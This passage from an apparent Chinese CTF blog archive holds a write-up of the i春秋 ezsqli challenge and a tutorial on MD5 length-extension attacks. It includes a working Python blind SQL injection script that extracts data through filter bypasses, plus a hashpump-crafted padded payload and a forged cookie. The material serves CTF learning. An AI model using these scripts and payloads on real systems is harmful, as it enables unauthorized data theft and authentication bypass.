<p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CDesktop%5Cwp%5CPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets%5Cimage-20210105171408311.png" srcset="/img/loading.gif" alt="image-20210105171408311"></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>pker</p>
<p><a href="https://github.com/eddieivan01/pker" target="_blank" rel="noopener">https://github.com/eddieivan01/pker</a></p>
<p>参考：<a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></p>
<p><a href="https://www.v0n.top/2020/03/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.v0n.top/2020/03/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
]]></content>
      <categories>
        <category>常见漏洞</category>
      </categories>
      <tags>
        <tag>Python反序列</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋新春战‘疫’复现</title>
    <url>/2020/03/04/I%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E2%80%98%E7%96%AB%E2%80%99%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="i春秋新春战‘疫’WEB复现"><a href="#i春秋新春战‘疫’WEB复现" class="headerlink" title="i春秋新春战‘疫’WEB复现"></a><strong>i春秋新春战‘疫’WEB复现</strong></h1><p>这个假期过得确实太颓了，再不学习是真的要凉凉。</p>
<p>反思反思反思…</p>
<p>还是做题太少了。</p>
<a id="more"></a>

<h2 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h2><p>首先常规输下1,2回显不同</p>
<img src="/2020/03/04/I春秋新春战‘疫’复现/1.png" srcset="/img/loading.gif" title="image">

<p>输入1 or 回显SQL Injection Checked.</p>
<p>这里or被过滤（其实这里直接or返回的是bool(false)，可能间接说明用的不是preg_match?没想清楚是怎么写的，参考别人的wp应该是题目与原题有出入）</p>
<img src="/2020/03/04/I春秋新春战‘疫’复现/2.png" srcset="/img/loading.gif" title="image">

<p>fuzz一下过滤了的关键词</p>
<img src="/2020/03/04/I春秋新春战‘疫’复现/3.png" srcset="/img/loading.gif" title="image">

<p>其中的information被过滤意味着我们常规的查表语句无法使用，就需要有其他数据库来代替它：</p>
<p>MySQL5.7的新增了sys schemma，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。（需要root权限）</p>
<p><strong>sys.schema_auto_increment_columns</strong></p>
<p><strong>schema_table_statistics_with_buffer</strong></p>
<p><strong>x$schema_table_statistics_with_buffer</strong></p>
<p><strong>sys.x$schema_flattened_keys</strong></p>
<p>…</p>
<p>诸如此类还有很多能应用的库。</p>
<p>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p>
<p>可是这个库不包含列名，所以又涉及到无列名注入的知识点。</p>
<p>但无列名注入通常依托union来实现，而这里的union也被过滤了（原题情况是union select不能连用）。</p>
<p>如果表中仅有一列：substr((select * from table),1,1)=‘x’即可实现目的。</p>
<p>但本题中不止一列，需要将查询语句与相同数量的列进行比较，进行盲注 。</p>
<p>例如：</p>
<pre><code>执行select (select &#39;1&#39;,&#39;e~&#39;)&gt;(select * from table2 limit 1)显示0
执行select (select &#39;1&#39;,&#39;f~&#39;)&gt;(select * from table2 limit 1)显示1
执行select (select &#39;1&#39;,&#39;fl~&#39;)&gt;(select * from table2 limit 1)显示1
所以可以进行盲注</code></pre><p>但问题在于，mysql默认不区分大小写，因此这种形式只有在flag仅为大/小写时适用。（比如本题）</p>
<p>而区分大小写需要使用 <strong>SELECT CONCAT(“A”, CAST(0 AS JSON))</strong> 来另其返回二进制字符串。</p>
<p>综上，脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">"http://55e66a5c-d66a-4320-bf74-210dd4750bd7.node3.buuoj.cn/index.php"</span>

<span class="token keyword">def</span> <span class="token function">exp1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    select <span class="token operator">=</span> <span class="token string">'select group_concat(table_name) from sys.x$schema_flattened_keys'</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
            paylaod <span class="token operator">=</span> <span class="token string">"1 &amp;&amp; (select substr(({}),{},1))='{}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>select<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#print(paylaod)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> i
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>

<span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#区分大小写(应该是环境有问题 跑不出)</span>
    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'-0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_uppercase<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    flag_table_name <span class="token operator">=</span> <span class="token string">'f1ag_1s_h3r3_hhhhh'</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
            i <span class="token operator">=</span> flag<span class="token operator">+</span>i
            paylaod <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {}))"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag_table_name<span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#print(paylaod)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag<span class="token operator">=</span>i
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
<span class="token keyword">def</span> <span class="token function">exp3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不区分大小写</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            a<span class="token operator">=</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span>
            payload <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,0x%s7e)>(select * from f1ag_1s_h3r3_hhhhh))"</span><span class="token operator">%</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    exp1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exp2<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exp3<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>参考：<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104476566" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104476566</a></p>
<p><a href="https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2</a></p>
<p><strong>持续更新…</strong></p>
]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>BUUCTF</tag>
        <tag>无列名无unionselect注数据</tag>
        <tag>无in注表名</tag>
      </tags>
  </entry>
  <entry>
    <title>HASH长度扩展攻击</title>
    <url>/2019/11/30/md5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。<a id="more"></a></p>
<h1 id="md5的工作原理"><a href="#md5的工作原理" class="headerlink" title="md5的工作原理"></a>md5的工作原理</h1><p>如下图所示</p>
<img src="/2019/11/30/md5扩展攻击/1.png" srcset="/img/loading.gif" title="image">

<p>其中笼统的一共可以分为四个部分</p>
<p><strong>*Padding填充</strong></p>
<p><strong>*Length填充长度</strong></p>
<p><strong>*初始化向量</strong></p>
<p><strong>*复杂的函数运算</strong>（这里可以忽略）</p>
<p>大体概括：md5是分组加密。加密时以每512bit(64byte=&gt;16个数字)为一组，从第一组开始，与四个固定的初始化向量进行复杂运算，进而得到四个新的向量，再将<strong>计算得到的向量作为下一组运算的初始向量</strong>继续运算。</p>
<p>但是显而易见我们加密的字符大多数情况下不能正好为64byte，md5以填充的方式解决这个问题。</p>
<h2 id="Padding填充"><a href="#Padding填充" class="headerlink" title="Padding填充"></a>Padding填充</h2><p><u><strong>填多少</strong></u></p>
<p>md5根据消息的长度来确定填充的字节数，由于64byte中最后的8byte用来存储原消息长度，故</p>
<p>填充后消息长度 mod 512 = 448 (512-8*8)  bit</p>
<p>eg.如果信息是‘message’ -&gt; 7byte -&gt; 56bit，那么就填充392bit。</p>
<p><u><strong>填啥</strong></u></p>
<p>使用二进制补位</p>
<p>10000000 …</p>
<p>转成十六进制就是第一个字节是0x80，剩余数据用 0x00 填充。</p>
<p>承上面那个例子，那么这里要填 0x80 + 0x00 *48</p>
<p><strong><u>填充消息长度</u></strong></p>
<p>这里需要注意长度是小端存储的，即高字节存放在高地址中。</p>
<h2 id="初始化向量"><a href="#初始化向量" class="headerlink" title="初始化向量"></a>初始化向量</h2><p>A      01 23 45 67     0x67452301<br>B      89 AB CD EF  0xEFCDAB89<br>C      FE DC BA 98  0x98BADCFE<br>D      76 54 32 10     0x10325476</p>
<p>以上是四个固定的初始化向量，他们也是小端存储。</p>
<p>再与补位后的消息进行复杂运算后，还是上面的‘message’例子，最终得到的md5<em>值是</em>78e731027d8fd50ed642340b7c9a63b3。</p>
<img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image">

<h1 id="MD5长度扩展攻击"><a href="#MD5长度扩展攻击" class="headerlink" title="MD5长度扩展攻击"></a>MD5长度扩展攻击</h1><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>MD5拓展攻击正是针对加盐措施的一种升级后的攻击手段，我们可以在不知道盐的情况下得出加盐后的md5的值。但需要在以下条件才能实现：</p>
<p>1.我们要知道salt的长度。(为了能得到正确的填充）<br>2.要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。<br>3.用户可以提交md5值。</p>
<p>例如我们知道一条信息的MD5值是78e731027d8fd50ed642340b7c9a63b3，我们还同时得知信息内容为message，可以构造出下图（这里的信息可以替换成salt+已知信息，加盐情况下需要知道salt长度）</p>
<img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image">

<p>然后它与初始向量复杂运算，得到</p>
<p>A=0x0231e778<br>B=0x0ed58f7d<br>C=0x0b3442d6<br>D=0xb3639a7c</p>
<p>也就是上面的MD5值。</p>
<p>若在已补位后的消息后继续追加字符串‘admin’，</p>
<p>则会对其再次进行补位成为第二组。</p>
<p>他会把上面得出的这组值作为初始向量，并与他进行复杂运算。这样会得到最终的md5值e53a681a30ff99e3f6522270ca7db244。</p>
<p>这个值是md5（消息+填充+追加消息）。实际上就是md5(message+admin)的值。</p>
<h2 id="原理实现"><a href="#原理实现" class="headerlink" title="原理实现"></a>原理实现</h2><h3 id="已知salt长度"><a href="#已知salt长度" class="headerlink" title="已知salt长度"></a><strong>已知salt长度</strong></h3><p><strong>实验吧–让我进去</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"XXXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"XXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This secret is 15 characters long for security!</span>

<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"Congratulations! You are a registered user.\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"The flag is "</span><span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"You are not an admin! LEAVE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"sample-hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">"admin"</span> <span class="token punctuation">.</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"source"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"source"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"source"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This source code is outputted here</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Admins Only<span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token keyword">If</span> you have the correct credentials<span class="token punctuation">,</span> log in below<span class="token punctuation">.</span> <span class="token keyword">If</span> not<span class="token punctuation">,</span> please <span class="token constant">LEAVE</span><span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    Username<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
    Password<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Submit<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
<p>分析判断条件</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>只要user始终为admin,pw的值不为admin就可达成条件</p>
<p>同时已知user=admin，pw=admin的 <strong>sample-hash=571580b26c65f306376d4f64e53cb5c7</strong>（从cookie得到）</p>
<p>题中给出<strong>salt长度为15</strong></p>
<p>这里就可以使用md5扩展攻击，在原基础上添加任意消息即可达成目的。</p>
<p>工具hashpump</p>
<img src="/2019/11/30/md5扩展攻击/4.png" srcset="/img/loading.gif" title="image">

<p>因为user值不变，也相当于salt的一部分，所以data直接填admin，salt长度为20（15+5）</p>
<img src="/2019/11/30/md5扩展攻击/5.png" srcset="/img/loading.gif" title="image">

<p>$$<br>f599284f8f2116348036a3f46e79c12b<br>$$<br>传到cookie的getmein里</p>
<p>$$<br>password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dwm2<br>$$<br>由于还有个urldecode,转下码post上去得到flag。</p>
<p>//HashPump下载</p>
<p>$$<br>git clone <a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a><br>apt-get install g++ libssl-dev<br>cd HashPump<br>make<br>make install<br>$$</p>
<h3 id="未知salt长度"><a href="#未知salt长度" class="headerlink" title="未知salt长度"></a><strong>未知salt长度</strong></h3><p><strong>Jarvis OJ–flag在管理员手里</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token string">"guest"</span><span class="token punctuation">;</span>
                <span class="token variable">$salt</span> <span class="token operator">=</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//需要传入被序列化的数据</span>
                        <span class="token variable">$hsh</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"hsh"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
